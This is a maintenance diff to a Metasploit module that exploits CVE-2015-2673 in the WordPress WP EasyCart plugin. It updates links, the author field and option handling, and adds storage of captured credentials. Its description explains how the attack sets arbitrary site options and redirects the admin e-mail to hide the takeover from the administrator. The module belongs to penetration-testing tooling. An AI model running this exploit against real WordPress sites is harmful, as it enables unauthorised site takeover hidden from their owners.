@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
@@ -14,7 +12,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'            => 'WordPress WP EasyCart Plugin Privilege Escalation',
       'Description'     => %q{
         The WordPress WP EasyCart plugin from version 1.1.30 to 3.0.20 allows authenticated
-        users  of any user level to set any system option via a lack of validation in the
+        users of any user level to set any system option via a lack of validation in the
         ec_ajax_update_option and ec_ajax_clear_all_taxrates functions located in
         /inc/admin/admin_ajax_functions.php. The module first changes the admin e-mail address
         to prevent any notifications being sent to the actual administrator during the attack,
@@ -24,14 +22,14 @@ class MetasploitModule < Msf::Auxiliary
       },
       'Author'          =>
         [
-          'Rob Carr <rob[at]rastating.com>' # Discovery and Metasploit module
+          'rastating' # Discovery and Metasploit module
         ],
       'License'         => MSF_LICENSE,
       'References'      =>
         [
           ['CVE', '2015-2673'],
           ['WPVDB', '7808'],
-          ['URL', 'http://blog.rastating.com/wp-easycart-privilege-escalation-information-disclosure']
+          ['URL', 'https://rastating.github.io/wp-easycart-privilege-escalation-information-disclosure/']
         ],
       'DisclosureDate'  => 'Feb 25 2015'
       ))
@@ -40,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
         OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
-      ], self.class)
+      ])
   end
 
   def check
@@ -80,6 +78,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Failed to authenticate with WordPress")
       return
     end
+    store_valid_credential(user: username, private: password, proof: cookie)
     print_good("Authenticated with WordPress")
 
     new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
